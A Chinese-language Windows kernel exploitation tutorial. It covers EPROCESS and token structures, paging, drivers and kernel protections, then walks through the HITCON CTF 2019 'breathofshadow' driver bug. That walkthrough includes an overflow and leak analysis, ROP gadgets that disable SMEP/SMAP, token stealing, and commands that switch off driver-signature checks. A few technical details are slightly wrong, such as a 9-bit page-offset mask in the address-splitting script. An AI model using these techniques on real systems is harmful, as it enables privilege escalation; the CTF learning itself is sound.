# Windows Kernel exploitation
> Author: 堇姬Naup


## What is Kernel
kernel位於application和hardware之間，是OS的core也負責溝通hadware和process
負責了像是
I/O、process、memory、driver managemet或是syscall 等事情

kernel也提供了可以跑application的環境
application是run在ring3，而kernel則是ring0

```
           +------------------+
           |   Application    |
           +------------------+
                   |  ^
                   v  |
           +------------------+
           |     Kernel       |
           +------------------+
           ^  ^          ^   ^
           |  |          |   |
   +-------+  |          |   +--------+
   |          |          |            |
+--v--+   +---v--+     +--v--+   +----v---+
| CPU |   | RAM  |     | Disk |   |   ...  |
+-----+   +------+     +------+   +--------+
```


## Kernel exploit on windows
target有像是driver或是kernel
driver:
- .sys
- win32k.sys
- srv2.sys
- ...

kernel:
- C:\Windows\system32\ntoskrnl.exe

## Overview
![image](https://hackmd.io/_uploads/BJ3oIxTVJe.png)

將它拆分成更細
- User Process: 就是我們平時在跑的應用程式等，都是一個process，像是browser、cmd.exe
- subsystem DLL: 先看甚麼是subsystem，可以參考這篇
http://www.fmddlmyy.cn/text5.html
所有的win32 api呼叫都指向subsystem dll(kernel32.dll、kernelbase.dll、gdi32.dll、user32.dll、ntdll.dll、win32u.dll...)，api都在這實現
- NTDLL: 從ring3 到ring0的入口所有win32 api調用了subsystem dll後會去調用ntdll.dll中函數實現(NTDLL.DLL exports the WindowsNative API)
- Service Process: SCM(https://learn.microsoft.com/zh-tw/windows/win32/services/service-control-manager)管理的Process
- system process: 系統重要process(有很多)，被中止非常有機會BSOD
- subsystem process: 控制圖形subsystem、manage process(csrss.exe)
- win32k.sys: windows kernel driver，負責處理圖形及窗口管理(處理GDI)，https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-createwindowexa
這些由他處理
- executive: Upper layer of Ntoskrnl.exe，I/O、memory、Object manager
- kernel: 處理更底層事務，像是interrupt等
- device driver: 可以想像是程式對設備操作中間的介面，透過driver來去與device進行互動(A driver provides a software interface to hardware devices, enabling operating systems and other computer programs to access hardware functions without needing to know precise details about the hardware being used.)
- HAL

## environment setting
HOST is windows 11 and user vmware + ubuntu 22.04 write exploit 
- VMware + windows 24H2 VM (Need two windows to debug windows kernel)
https://www.microsoft.com/zh-tw/software-download/windows11
- Process Monitor
https://learn.microsoft.com/zh-tw/sysinternals/downloads/procmon
- Process Explore
https://learn.microsoft.com/zh-tw/sysinternals/downloads/process-explorer
- Windbg
https://learn.microsoft.com/zh-tw/windows-hardware/drivers/debugger/
- PEbear
https://github.com/hasherezade/pe-bear

### how to debug kernel(use windbg attach kernel)

[ref1](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-)
[ref2](https://scorpiosoftware.net/2023/03/07/levels-of-kernel-debugging/)

Debug kernel需要兩台windows

先進VM
首先可以先下bcdedit，如果上面沒有debug代表沒開
![image](https://hackmd.io/_uploads/B18B-GANJg.png)

去找到msconfig，選boot > advanced option > debug打開
![image](https://hackmd.io/_uploads/rJhi-GRE1e.png)

現在你去下bcdedit就會有debug: on了，另外如果你確認時跳出boot secure問題，就要進去boot把它關掉
![image](https://hackmd.io/_uploads/HytPzz0Eye.png)

有兩種debug方式，serial port跟net，這邊先用net方式debug
之後下這個command
`bcdedit /DBGSETTINGS NET HOSTIP:IP PORT:50000 
KEY:w.x.y.z`

KEY是為了防止不要讓任何人都可以debug你的kernel
設好就重啟VM

現在回到你的HOST，用windbg的attack kernel，attach上去

如果你有看到attach kernel 代表成功了，不過有時候會失敗
![image](https://hackmd.io/_uploads/By30_GAN1g.png)

所以我們試試看serial port

![image](https://hackmd.io/_uploads/ByXw5M0Nyl.png)

之後就到attach kernel 的COM把資訊填上去就行

反正我們已經attach好了
![image](https://hackmd.io/_uploads/Hyrmnf0EJg.png)

如果卡住按一下break就可以了

## Basic Knowledge
附註: 以下的offset可能不同，實際情況用windbg直接追就可以了

[ref1](https://codemachine.com/articles/kernel_structures.html)

### process
甚麼是process應該不用解釋，當create process後會去call win32 API,
之後進到kernel層創建一個PCB(process control block)，記錄整個process的資訊
PCB不太完整，準確來說 struct是EPROCESS
```
--------------------- 0x0
|                   |
|       PCB         |
---------------------
|       ...         |
--------------------- 0x440
| Unique process id |
--------------------- 0x448
|Active process link|
---------------------
|       ...         |
--------------------- 0x4b8
|       Token       |
--------------------- 
|       ...         |
--------------------- 0x550 
|       PEB         |
--------------------- 
|       ...         |
--------------------- 0x5e0
| Thread list head  |
--------------------- 
|       ...         |
--------------------- 
```

- UID: process ID
- Active process link: 將EPROCESS串成一個double linklst(process被串起來)
![image](https://hackmd.io/_uploads/rkt8XZTNkl.png)
- Token
- PEB
- Thread list head


PCB裡面長這樣
```
---------------------
|       ...         |
--------------------- 0x28
| DirectoryTableBase|
--------------------- 
|       ...         |
--------------------- 0x280
|    Base Priority  |
---------------------
|       ...         |
--------------------- 0x388
|  User Directory   |
|    Table base     |
---------------------
```

- DirectoryTableBase: PML4實體位址，context switch後變成cr3
- User Directory Table Base: PML4實體位址，return到usermode時改為存放cr3

至於cr3、PML4是甚麼在Virtual address to Physical address提到



### Thread
createThread時會創建
https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

Thread間用linklist串在一起
跟process一樣創建一個ETHREAD，裡面的TCB(Thread control block)，負責管理整個thread

ETHREAD struct
```
----------------- 0x0
|               | 
|     TCB       | 
|               | 
-----------------
|     ...       | 
----------------- 0x4b0
|   IRPlist     | 指向正在處理的IRP
-----------------
|     ...       | 
----------------- 0x4b8
|ThreadListEntry| 
-----------------
|     ...       | 
-----------------
```

TCB
```
----------------- 0x0
|     ...       | 
----------------- 0x58
| Kernel Stack  | context switch 發生時負責記錄當前狀態的stack
-----------------
|     ...       | 
----------------- 0x90
|    TrapFrame  | trap 時的frame，用來記錄進入kernel mode時所有register狀態
-----------------
|     ...       | 
----------------- 0xf0
|      TEB      | 指向userspace
-----------------
|     ...       | 
----------------- 0x220
|    Process    | 指向該thread所屬的process的ERPORCESS
-----------------
|     ...       | 
----------------- 0x232
| Previous Mode | request從usermode還是kernel mode來的(0 is kernel, 1 is user)，kernel mode會少很多檢查
-----------------
|     ...       | 
-----------------
```

### Integrity Level
將 Object、Process等進行分級，共用六個等級，低level不能存取高level
untrusted, low, medium, high, system、Protected
我們正常的程式都是跑在medium

| Level     | Description                                                                                 |
|-----------|---------------------------------------------------------------------------------------------|
| Untrusted | Started by Anonymous group. Block most write access.                                        |
| Low       | Used by AppContainer. Block most write access to most object (files and registry) on system. |
| Medium    | Used by normal application if UAC is enabled.                                               |
| High      | Used by administrative application when UAC is enabled.                                     |
| System    | Used by system services or system process.                                                  |
| Protected | Currently unused by default.     

### ACL
ACL:
https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-control-lists
ACE:
https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-control-entries
是存取控制項目ACE (ACL 可以有零個或多個 ACE。 每個 ACE 都會由指定的信任者控制或監視物件的存取)的清單

安全性實體物件的安全性描述項可以包含兩種類型的ACL：DACL和SACL


https://0xfocu5.github.io/posts/37e301d0/

### SID
https://0xfocu5.github.io/posts/37e301d0/

### Access Token
user登入windows時會拿到一組access token代表當前登入者
用來表示process security context
Windows會透過Token來判斷該物件是否可被存取及能做哪些操作

_TOKEN stuct
```
----------------- 0x0
|     ...       | 
----------------- 
|  Priviledges  | 該process擁有的priviledge (_SEP_TOKEN_PRIVILEDGE)
-----------------
| Audit Policy  | https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/audit-policy
----------------- 
|     ...       | 
----------------- 
| UserAndGroup  | 
-----------------
|     ...       | 
----------------- 
| Integrity     |
|    LevelIndex | 
-----------------
```

priviledge (_SEP_TOKEN_PRIVILEDGE
```
+-----------------+
|    present      | 表示該token所具有的priviledge
+-----------------+
|     enable      | enable/disable
+-----------------+
|       ...       |
+-----------------+
```

#### primary token
當thread與process對secure Object進行互動時使用
用於描述與process的secure context
https://rootclay.gitbook.io/windows-access-control/access-token

#### impersonation token


### control register(CPU Control)
負責控制及確定CPU模式、特性及行為，可以參考該docs的2.5(p.3069)
[docs](https://www.intel.com.tw/content/www/tw/zh/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html)

`Control registers (CR0, CR1, CR2, CR3, and CR4; see Figure 2-7) determine operating mode of the processor and
the characteristics of the currently executing task. `

- CR2: 當發生page fault時，會儲存異常的Virtual address
( Contains the page-fault linear address. The linear address is caused a page fault.)
- CR3: CPU用來做address translate會用到，該register存放當前process的page table physical address(PML4)
- CR4: 用來啟用或調整CPU的各種進階功能和擴展
(Contains a group of flags that enable several architectural extensions, and indicate operating system or executive support for specific processor capabilities. Bits CR4[63:32] can only be used for IA-32e mode only features that are enabled after entering 64-bit mode. Bits CR4[63:32] do not have any effect outside of IA-32e mode.)
- CR8: IRQL

![image](https://hackmd.io/_uploads/SyxIH5EpNyx.png)

每個bits 詳細功能也請直接參考該docs，其中最容易遇到的應該是CR4 20 21位的SMEP SMAP

### MMU(Memory manager unit)
我們在process看到的記憶體是一串Virtual address，他透過映射的方式映射到Physical address(在Access的當下，CPU去將Virtual address轉成Physical address)
以下是Virtual Memory layout
```
------------------
|                |
| Kernel Space   | (Kernel, sys, page table ...)
|                |
------------------ 0xffff80000000
|                |  This part is not canonical address
|   No Access    |  因為AMD 64只實現 48 bits Virtual Address
|                |
------------------ 0x800000000000
|   No Access    |
------------------ 0x7fffffff0000
|                |
|  User Space    | (exe, dll, process)
|                |
------------------
```

另外透過Virtual Address可實現Isolation Process，只要看你給的address有沒有在Virtual address裡面就可以，頂多影響到自己process擁有的Physicsl address
也解決了跳轉問題，程式只需要跳轉到Virtual address，硬體會幫你映射到對應的Physical address
你就不需要對Physical address直接進行操作了



#### page
你可以想像是Memory的最小單位(若以segment作為memory單位太大了)
通常一page是4KB(0x1000)，不過具體大小由CPU決定
詳細可以參考這個
https://wiki.osdev.org/Paging

#### page table
儲存虛擬位址到實體位址的對映
每個表上的對應被稱作PTE(page table entry)

![image](https://hackmd.io/_uploads/B1ZnLBTEJx.png)

### PTE
每個PTE長這樣
PFN存的就是offset(一個頁表0x1000，用3byte剛好表示完)
| Name of bit | Meaning                    |
|-------------|----------------------------|
| Nx          | Non - execute              |
| PFN         | Page Frame Number          |
| Ws          | Write bit (software)       |
| Cw          | Copy on write              |
| Gl          | Global                     |
| L           | Large Page                 |
| D           | Dirty                      |
| A           | Accessed                   |
| Cd          | Cache disable              |
| U/S         | User mode/supervisor bit   |
| W           | Write bit (hardware)       |
| V           | Valid                      |

![image](https://hackmd.io/_uploads/BJcrPBaN1g.png)


#### demand page
當真正有去摸到那塊physical address
才會分配page給他
實際上R/W/X的時候才會分配physical address及建立PTE(但大多數API在alloc就會做讀寫了)

#### page fault
訪問的Virtual address在Physical Address未被載入時會觸發此錯誤

#### Swap in/out
把很久沒用到的page swap到disk

#### Virtual address to Physical address

![image](https://hackmd.io/_uploads/B1ZnLBTEJx.png)

假設要轉換這個0xffffffff8111c398
0b1111111111111111 | 111111111 | 111111110 | 000001000 | 100011100 | 001110011000
分別對應
第一段跟上述所說的一樣，AMD64只實現48bits，為規範address
接下來分別對應
PML4I    0b111111111    511
PDPI    0b111111110    510
PDI    0b000001000    8
PTI    0b100011100    284
Offset    0b001110011000    920

首先從 CR3 爬出 Page-Map Level-4 Table Base
第 PML4 個 Entry 紀載下一級頁表 PDP 的 Base
第 PDPT 個 Entry 紀載下一級頁表 PD 的 Base
第 PD 個 Entry 紀載下一級頁表 PT 的 Base
第 PT 個 Entry 紀載 Physical Page Frame Base
Physical Page Frame Base + Physical Page Offset 就完成了轉換

更詳細去拆解四個page table可以參考這篇
https://hackmd.io/@LJP/rkxtGgoIO

如何手算可以參考Physical Address
https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows

PS: 我要強調，這裡是從page table查到對應的page frame(等於找到page frame base)，在該page上通過offset去找實體記憶體位置

#### gdb demo 

首先一樣先attach上去kernel
我們來轉換nt好了
先對windbg下`dp nt`
```
fffff801`81c00040  cd09b400`0eba1f0e 685421cd`4c01b821
```
來轉換 fffff801\`81c00040

```
kd> !process 0 0 cmd.exe
PROCESS ffffac8d897a8080
    SessionId: none  Cid: 193c    Peb: f0396d000  ParentCid: 1214
    DirBase: 172636000  ObjectTable: ffffc2067ac51ec0  HandleCount:  70.
    Image: cmd.exe
```

首先是可以用vtop
用法是
`!vtop <PEB base> <Virtual Address>`

```
kd> !vtop 172636000 fffff8079a800040
Amd64VtoP: Virt fffff8079a800040, pagedir 0000000172636000
Amd64VtoP: PML4E 0000000172636f80
Amd64VtoP: PDPE 00000000001d00f0
Amd64VtoP: PDE 00000000002536a0
Amd64VtoP: Large page mapped phys 0000000100200040
Virtual address fffff8079a800040 translates to physical address 100200040.
```

用 `!dp <address>`可以查看physical address上的值
將轉換出來的physical address查看一下發現值一樣，成功

```
kd> !dp 100200040
#100200040 cd09b400`0eba1f0e 685421cd`4c01b821
```

不過當然這邊也手算一次，我們改用cmd.exe
先切換到cmd.exe process

`.process /r /p ffffac8d897a8080`
現在下dp ntdll就可以看到cmd.exe的ntdll
```
kd> dq ntdll
00007ffa`e2680000  00000003`00905a4d 0000ffff`00000004
00007ffa`e2680010  00000000`000000b8 00000000`00000040
00007ffa`e2680020  00000000`00000000 00000000`00000000
00007ffa`e2680030  00000000`00000000 000000e0`00000000
00007ffa`e2680040  cd09b400`0eba1f0e 685421cd`4c01b821
00007ffa`e2680050  72676f72`70207369 6f6e6e61`63206d61
00007ffa`e2680060  6e757220`65622074 20534f44`206e6920
00007ffa`e2680070  0a0d0d2e`65646f6d 00000000`00000024
```
通過ntdll去找PTE
```
kd> !pte 00007ffae2680000
                                           VA 00007ffae2680000
PXE at FFFFC0E0703817F8    PPE at FFFFC0E0702FFF58    PDE at FFFFC0E05FFEB898    PTE at FFFFC0BFFD713400
contains 0A0000013D174867  contains 0A0000013D177867  contains 0A0000013D178867  contains 810000010010D025
pfn 13d174    ---DA--UWEV  pfn 13d177    ---DA--UWEV  pfn 13d178    ---DA--UWEV  pfn 10010d    ----A--UR-V
```

試著轉換`00007ffae2680000`

我寫了腳本
```py
def PAtoVA_4page_cal(address):
    PML4_offset = (address >> 39) & 0b111111111
    PDPT_offset = (address >> 30) & 0b111111111
    PD_offset = (address >> 21) & 0b111111111
    PT_offset = (address >> 12) & 0b111111111
    PhysicalAddress_offset = (address) & 0b111111111

    print("PML4_offset: ",hex(PML4_offset))
    print("PDPT_offset: ",hex(PDPT_offset))
    print("PD_offset: ",hex(PD_offset))
    print("PT_offset: ",hex(PT_offset))
    print("PhysicalAddress_offset: ",hex(PhysicalAddress_offset))
```
轉換結果是
PML4_offset:  0xff
PDPT_offset:  0x1eb
PD_offset:  0x113
PT_offset:  0x80
PhysicalAddress_offset:  0x0

PML4就是這個 `DirBase: 172636000`(也是CR3存的值)
把他加上offset * 8後會找到該表上面的值
```
kd> !dp 172636000+(0xff*8)
#1726367f8 0a000001`72642867 00000000`00000000
```
這就是第二層(PFN 0xa00000172642867)
記得去掉低12bits跟高1bits，剩下的PFN(0x172642000)
以此類推第二層
```
kd> !dp 0x172642000+(0x1eb*8)
#172642f58 0a000001`72545867 00000000`00000000
#172642f68 00000000`00000000 00000000`00000000
```
第三層(0x00172545000)
```
kd> !dp 0x00172545000+(0x113*8)
#172545898 0a000002`25b46867 0a000001`72547867
#1725458a8 00000000`00000000 00000000`00000000
```
第四層(0x00225b46000)
```
kd> !dp 0x00225b46000+(0x80*8)
#225b46400 81000001`0010d025 01000001`1a3a6025
```
找到 page frame base (0x00010010d000)
最後加上offset 0x0就是physical address了(看到資料一樣代表成功了)
```
kd> !dp 0x00010010d000
#10010d000 00000003`00905a4d 0000ffff`00000004
#10010d010 00000000`000000b8 00000000`00000040
#10010d020 00000000`00000000 00000000`00000000
#10010d030 00000000`00000000 000000e0`00000000
#10010d040 cd09b400`0eba1f0e 685421cd`4c01b821
#10010d050 72676f72`70207369 6f6e6e61`63206d61
#10010d060 6e757220`65622074 20534f44`206e6920
#10010d070 0a0d0d2e`65646f6d 00000000`00000024
```
用vtop看的話也確認是正確的

## windows driver
讓程式與device溝通的一個橋樑，通常可以利用syscall溝通
目前主流架構是Windows driver model

一個WDM載入device方式
* 呼叫 IoCreateDevice 建立一個 Device
* 呼叫 IoCreateSymbolicLink 建立一個 Symbolic Link 連結到上一步建立的 Device，如此應用程式就可以透過呼叫 CreateFile 取得這個 Device 的 Handle
* 設定處理每個 IRP 請求的函數


怎麼寫code可以參考
https://ithelp.ithome.com.tw/articles/10322132

另外在逆向時MajorFunction可能只是index，可以參考這個
```
#define IRP_MJ_CREATE                             0x00
#define IRP_MJ_CREATE_NAMED_PIPE                  0x01
#define IRP_MJ_CLOSE                              0x02
#define IRP_MJ_READ                               0x03
#define IRP_MJ_WRITE                              0x04
#define IRP_MJ_QUERY_INFORMATION                  0x05
#define IRP_MJ_SET_INFORMATION                    0x06
#define IRP_MJ_QUERY_EA                           0x07
#define IRP_MJ_SET_EA                             0x08
#define IRP_MJ_FLUSH_BUFFERS                      0x09
#define IRP_MJ_QUERY_VOLUME_INFORMATION           0x0a
#define IRP_MJ_SET_VOLUME_INFORMATION             0x0b
#define IRP_MJ_DIRECTORY_CONTROL                  0x0c
#define IRP_MJ_FILE_SYSTEM_CONTROL                0x0d
#define IRP_MJ_DEVICE_CONTROL                     0x0e
#define IRP_MJ_INTERNAL_DEVICE_CONTROL            0x0f
#define IRP_MJ_SHUTDOWN                           0x10
#define IRP_MJ_LOCK_CONTROL                       0x11
#define IRP_MJ_CLEANUP                            0x12
#define IRP_MJ_CREATE_MAILSLOT                    0x13
#define IRP_MJ_QUERY_SECURITY                     0x14
#define IRP_MJ_SET_SECURITY                       0x15
#define IRP_MJ_POWER                              0x16
#define IRP_MJ_SYSTEM_CONTROL                     0x17
#define IRP_MJ_DEVICE_CHANGE                      0x18
#define IRP_MJ_QUERY_QUOTA                        0x19
#define IRP_MJ_SET_QUOTA                          0x1a
#define IRP_MJ_PNP                                0x1b
#define IRP_MJ_PNP_POWER                          IRP_MJ_PNP      // Obsolete....
#define IRP_MJ_MAXIMUM_FUNCTION                   0x1b
```

那windows driver掛上去了，互動的流程是甚麼
- 當User application呼叫DeviceIoControl，由I/O manager建立並對windows driver送出IRP
- windows driver收到IRP並進行處理
- 回傳IoCompleteRequest，告知I/O manager完成

如果要試著寫windows driver可以參考
https://www.alex-ionescu.com/
https://www.apriorit.com/dev-blog/791-driver-windows-driver-model

Debug windows driver
https://ithelp.ithome.com.tw/m/articles/10326802

### IRP
I/O request packet
https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
Windows 中用於請求 I/O 操作的資料結構。驅動程式可以使用 IRP 來與 Kernel 溝通，例如讀取文件或進行網路傳輸。開發者也可以透過發 IRP 給 I/O Manager，並將 IRP 轉發給相應的驅動程式，從而執行對應的行為



IRP struct如下
```
------------------------
|   Type   |   Size    |
------------------------
|         ...          |
------------------------
|         MDL          |
------------------------
|         ...          |
------------------------
|      IOstatus        |
------------------------
|         ...          |
------------------------
|     StackCount       |
------------------------
|   CurrentLocation    |
------------------------
|         ...          |
------------------------
|    CancelRoutine     |
------------------------
|      UserBuffer      |
------------------------
|   IO_STACK_LOCATION  |
------------------------
|         ...          |
------------------------
```

![image](https://hackmd.io/_uploads/Hk722La41x.png)


### How to install windows driver
由於你的driver沒有簽章驗證，所以你必須開啟testing mode及關閉簽章驗證來掛上去你的driver

`bcdedit /set testsigning on`
`bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS`
`bcdedit /set nointegritychecks on`
之後重啟應該會看到testing

接下來把driver掛起來
`sc create <your driver name> binPath=<Path of driver on windows> type=kernel`
`sc start <your driver name>`
`sc delete <your driver name>`

如何掛起kernelmode windows driver可以參考
[https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-)

### how to use your driver
他會去與`\\.\BreathofShadow `進行交互
https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-createfilew
https://learn.microsoft.com/zh-tw/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol

PS: `\.\\`是device namespace
https://superuser.com/questions/1583205/what-kind-of-file-path-starts-with
https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file

```c
#define DeviceName L"\\\\.\\BreathofShadow"
HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

size_t* inputbuf = (size_t*)calloc(1, 0x100);
char outputbuf[256] = { 0 };
DWORD bytesReturned = 0;

BOOL result = DeviceIoControl(
        hDevice,
        0x9C40240B,
        inputbuf,
        0x100,
        (LPVOID)outputbuf,
        sizeof(outputbuf),
        &bytesReturned,
        NULL
    );
```

## Protection
### KASLR
每次開機時隨機化kernel address，只要不重新開機就不會變動

### SMEP
kernel mode不能執行userspace的code
是否開啟位於cr4 bit 20

### SMAP
kernel mode不能直接存取userspace data
是否開啟位於cr4 bit 21

### KVA shadow
在linux kernel把它叫做KPTI
kernel/Userland Page Table Isolation
在kernel mode時所有user space的PML4 NX bit會開起來，導致你就算disable SMEP也不能執行user space code

### Stack Cookies
就是stack canary的概念
https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/stack-cookies
```
.--------------------.-----------------------.
|    tmp[0]          |    0xDEADBEEF         | <- 4 bytes
|--------------------|-----------------------| 
|    tmp[1]          |    0x0                | <- 4 bytes
|--------------------|-----------------------|
|    ...             |    0x0                | <- each 4 bytes
|--------------------|-----------------------|
|    tmp[31]         |    0xCAFEBABE         | <- 4 bytes
|--------------------|-----------------------|
|    stack cookie    |    0x2311AC4753522700 | <- 8 bytes and random
|--------------------|-----------------------|
|    rbx register    |    saved rbx register | <- 8 bytes
|--------------------|-----------------------|
|    rip register    |    saved rip register | <- 8 bytes and random
.--------------------.-----------------------.
```

## information leak
如果process的integrity是medium
通過調用NtQuerySystemInformation可以獲得所有sys或nt address，及handle對應Object位置
https://learn.microsoft.com/zh-tw/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation

## ret2usr
核心概念是透過stack overflow，來Return 到userspace上的shellcode上，為何要跳回userspace原因是要在沒有任意讀任意寫情況下在kernel space 放shellcode並執行有難度，所以在userspace給一塊rwx個memory，並把shellcode寫進去跳進去

不過首先會遇到一個問題 SMAP/SMEP
不過在有stack overflow可以堆ROP時繞過他蠻簡單的，透過將cr4的第20bit 21bit蓋成0就可以了

pop rcx; ret
mov cr4, rcx ; ret

接下來透過shellcode來抓出token(高權限)，並寫掉自己的token來提權

## HITCON CTF 2019 Qual breathofshadow
https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/breathofshadow

### analyze
首先他給了一個windows drive，來分析看看
reverse windows driver 我有看到一篇不錯的文章可以參考
https://v1k1ngfr.github.io/winkernel-reverse-ida-ghidra/

```c
__int64 __fastcall sub_140006000(PDRIVER_OBJECT DriverObject)
{
  NTSTATUS v2; // edi
  unsigned __int64 v3; // rbx
  struct _UNICODE_STRING DeviceName; // [rsp+40h] [rbp-28h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+50h] [rbp-18h] BYREF
  PDEVICE_OBJECT DeviceObject; // [rsp+80h] [rbp+18h] BYREF

  DeviceObject = 0i64;
  RtlInitUnicodeString(&DeviceName, L"\\Device\\BreathofShadow");
  v2 = IoCreateDevice(DriverObject, 0, &DeviceName, 0x22u, 0x100u, 0, &DeviceObject);
  if ( v2 >= 0 )
  {
    DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&createdeleteHandle;
    DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&createdeleteHandle;
    DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&ctlHandler;
    DriverObject->DriverUnload = (PDRIVER_UNLOAD)sub_1400051C0;
    RtlInitUnicodeString(&DestinationString, L"\\DosDevices\\BreathofShadow");
    v2 = IoCreateSymbolicLink(&DestinationString, &DeviceName);
    if ( v2 < 0 )
    {
      DbgPrint("Couldn't create symbolic link\n");
      IoDeleteDevice(DeviceObject);
    }
    DeviceObject->Flags |= 0x10u;
    DeviceObject->Flags &= 0xFFFFFF7F;
    Seed = KeQueryTimeIncrement();
    v3 = (unsigned __int64)RtlRandomEx(&Seed) << 32;
    qword_140003018 = v3 | RtlRandomEx(&Seed);
    DbgPrint("Enable Breath of Shadow Encryptor\n");
  }
  else
  {
    _mm_lfence();
    DbgPrint("Couldn't create the device object\n");
  }
  return (unsigned int)v2;
}
```
這裡他建立了一個Device(IoCreateDevice)

` L"\\Device\\BreathofShadow"`是deivce name
然後去設定MajorFunction，處理IRP

第一個createdeleteHandle沒做甚麼就直接回傳IofCompleteRequest
```c
#define IRP_MJ_CREATE                             0x00
#define IRP_MJ_CLOSE                              0x02

__int64 __fastcall createdeleteHandle(__int64 a1, IRP *a2)
{
  a2->IoStatus.Status = 0;
  a2->IoStatus.Information = 0i64;
  IofCompleteRequest(a2, 0);
  return 0i64;
}
```

這邊重要的是
有些symbol爛了自己修一下
這邊補充一下IoStackLocation
https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location

詳細IoStackLocation可以參考這個
https://v1k1ngfr.github.io/pimp-my-pid/
```c
#define IRP_MJ_DEVICE_CONTROL                     0x0e

__int64 __fastcall ctlHandler(__int64 a1, IRP *IRP)
{
  unsigned int v3; // edi
  PIO_STACK_LOCATION IRP_STACK_LOCATION; // rax
  __int64 IoStackLocation; // rsi

  v3 = 0xC00000BB;
  IRP_STACK_LOCATION = IoGetCurrentIrpStackLocation(IRP);
  IoStackLocation = (__int64)IRP_STACK_LOCATION;
  if ( IRP_STACK_LOCATION )
  {
    if ( IRP_STACK_LOCATION->Parameters.Read.ByteOffset.LowPart == 0x9C40240B )
    {
      DbgPrint("Breath of Shadow Encryptor\n");
      v3 = sub_140005000((__int64)IRP, IoStackLocation);
    }
    else
    {
      DbgPrint("Invalid\n");
      v3 = -1073741808;
    }
  }
  IRP->IoStatus.Information = 0i64;
  IRP->IoStatus.Status = v3;
  IofCompleteRequest(IRP, 0);
  return v3;
}
```

如果IoControlCode是0x9C40240B，就Call進去
一樣是symbol全爛，自己修一下

NtDeviceIoControlFile:

* Parameters.DeviceIoControl.OutputBufferLength(0x8)
* Parameters.DeviceIoControl.InputBufferLength(0x10)
* Parameters.DeviceIoControl.IoControlCode(0x18)
* Parameters.DeviceIoControl.Type3InputBuffer(0x20)
* Parameters.QuerySecurity(0x28)

我們互動的東西會存在IoStackLocation的inputbuffer(可控)
他會將InputBuffer丟進去Dst(一個有限大小的buffer)
這裡就有一個buffer overflow

```c
__int64 __fastcall sub_140005000(__int64 IRP, __int64 IO_STACK_LOCATON)
{
  __m128i *InputBuffer; // rdi
  unsigned __int64 InputBufferLength; // rsi
  unsigned __int64 OutputBufferLength; // r14
  int i; // ecx
  __int64 Dst[32]; // [rsp+30h] [rbp-128h] BYREF

  InputBuffer = *(__m128i **)(IO_STACK_LOCATON + 32);
  InputBufferLength = *(unsigned int *)(IO_STACK_LOCATON + 16);
  OutputBufferLength = *(unsigned int *)(IO_STACK_LOCATON + 8);
  if ( !InputBuffer )
    return 3221225473i64;
  memset((__m128 *)Dst, 0, 0x100ui64);
  ProbeForRead(InputBuffer, 0x100ui64, 1u);
  memcpy((__m128i *)Dst, (unsigned __int64)InputBuffer, (unsigned int)InputBufferLength);
  for ( i = 0; i < InputBufferLength >> 3; ++i )
    Dst[i] ^= qword_140003018;
  ProbeForWrite(InputBuffer, 0x100ui64, 1u);
  memcpy(InputBuffer, (unsigned __int64)Dst, OutputBufferLength);
  return 0i64;
}
```
另外我們還需要information leak
原因是因為cookie(像是stack canary)、XorKey、KernelBase(ROP need)需要leak出來
這邊其實information leak洞非常明顯
如果inputbuffer塞超小
outputbuffer塞超大
DST值會只有少部分被xor
而DST被copy到inputbuffer(根據output buffer)
這樣就可以任意讀stack上的value(也就有information leak)

IoControl互動方式就跟上述一樣
```c
BOOL DeviceIoControl(
  [in]                HANDLE       hDevice,
  [in]                DWORD        dwIoControlCode,
  [in, optional]      LPVOID       lpInBuffer,
  [in]                DWORD        nInBufferSize,
  [out, optional]     LPVOID       lpOutBuffer,
  [in]                DWORD        nOutBufferSize,
  [out, optional]     LPDWORD      lpBytesReturned,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);
```
很顯然ret2usr
條件已經湊齊了
接著來看EoP

### EoP
https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/#token-stealing

目標是取得system integrity 的 process token，並寫進自己的process token
當我們有任意執行shellcode時，透過去traverse整個EPROCESS(linklist)，並找到system process，然後換掉自己的token成system process，來達到EoP

```
+------------------------+    +------------------------+    +------------------------+
|       _EPROCESS        |    |       _EPROCESS        |    |       _EPROCESS        |
+------------------------+    +------------------------+    +------------------------+
|         PCB            |    |         PCB            |    |         PCB            |
|        ....            |    |        ....            |    |        ....            |
|   UniqueProcessId      |    |   UniqueProcessId      |    |          4             |
|  ActiveProcessLinks    |<-->|  ActiveProcessLinks    |<-->|  ActiveProcessLinks    |
|        ....            |    |        ....            |    |        ....            |
|        Token           |    |        Token           |    |   Token (system token) |
|        ....            |    |        ....            |    |        ....            |
|         PEB            |    |         PEB            |    |         PEB            |
|        ....            |    |        ....            |    |        ....            |
